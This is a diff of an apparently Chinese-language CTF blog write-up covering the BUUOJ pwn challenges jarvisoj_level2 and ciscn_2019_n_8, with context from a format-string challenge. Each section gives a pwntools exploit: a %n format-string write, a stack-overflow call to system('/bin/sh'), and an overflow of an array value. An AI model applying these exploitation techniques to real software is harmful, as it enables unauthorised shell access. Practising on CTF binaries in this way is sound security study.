@@ -186,6 +186,30 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26754</span>)</span><br><span class="line">addr=<span class="number">0x804C044</span></span><br><span class="line">payload=p32(addr)+<span class="string">b&quot;%10$n&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>其中<code>%10$n</code>是让地址偏移十，<code>%11$n</code>同理。</p>
+<h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p><img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-03_11-45-41.png"></p>
+<p>只开启了NX</p>
+<p>发现<code>read</code>函数，限制0x100，但只需0x88即可使栈溢出</p>
+<p><img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-03_11-10-32.png"></p>
+<p>shift+f12查看Strings，发现有&#x2F;bin&#x2F;sh，但是没有找到调用该字符串的函数（悲）那就来构造罢</p>
+<p><img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-03_11-11-45.png"></p>
+<p>找到system的地址</p>
+<p><img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-03_11-55-48.png"></p>
+<p>和&#x2F;bin&#x2F;sh字符串的地址<img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-03_11-57-18.png"></p>
+<p>构造exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line">sys=<span class="number">0x08048320</span></span><br><span class="line">binsh=<span class="number">0x0804A024</span></span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">0x88</span>+<span class="string">b&quot;aaaa&quot;</span>+p32(sys)+p32(<span class="number">1</span>)+p32(binsh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>(ps:在左侧函数栏中找到了两个system，但是<code>_system</code>貌似才是真正的地址,暂时还不知道这两者的区别)</p>
+<p><img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-03_11-58-20.png"></p>
+<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>首先checksec <img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-04_12-34-50.png"></p>
+<p>第一次看到打开那么多的，害怕，但是先不要怕</p>
+<p>进去分析函数，发现其实并不难，只是要<code>var[13]=17</code>就行了</p>
+<p><img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-04_12-37-51.png"></p>
+<p>数组var里的都是<code>dword</code>，<code>Double Word</code>，即双字，四字节</p>
+<p><code>qword</code>是<code>Quad Word</code>，四字，也就是八字节，那不就是64位，</p>
+<p><img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-04_12-43-08.png"></p>
+<p>这里是对var的单个元素取至后将它强转为指向八字节数据(qword的解释)的指针</p>
+<p>所以说应该使用var[13]应该是p64(17)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">r&quot;./ciscn_2019_n_8&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;aaaa&quot;</span>*<span class="number">13</span>+p64(<span class="number">17</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
       
 
